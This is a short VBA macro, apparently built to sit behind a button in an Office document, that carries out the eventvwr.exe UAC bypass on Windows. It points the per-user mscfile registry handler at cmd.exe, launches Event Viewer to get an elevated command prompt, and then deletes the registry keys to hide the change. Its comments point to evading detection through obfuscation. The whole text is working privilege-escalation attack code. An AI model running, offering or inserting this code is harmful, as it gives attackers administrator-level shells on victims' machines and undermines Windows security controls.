' Credits to https://gist.github.com/dxflatline/6e399ea1fef59456d7ed82909f3bd506
' Sleep is caught (may use ping instead?)
' Obfusc may be needed
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Sub CommandButton1_Click()
   Set WSobj = CreateObject("WScript.Shell")
   WSobj.RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", ""
   WSobj.RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", "C:\windows\system32\cmd.exe", "REG_SZ"
   WSobj.Run ("C:\Windows\System32\eventvwr.exe")
   Sleep 2000
   WSobj.RegDelete "HKCU\Software\Classes\mscfile\shell\open\command\"
   WSobj.RegDelete "HKCU\Software\Classes\mscfile\shell\open\"
   WSobj.RegDelete "HKCU\Software\Classes\mscfile\shell\"
   WSobj.RegDelete "HKCU\Software\Classes\mscfile\"
End Sub
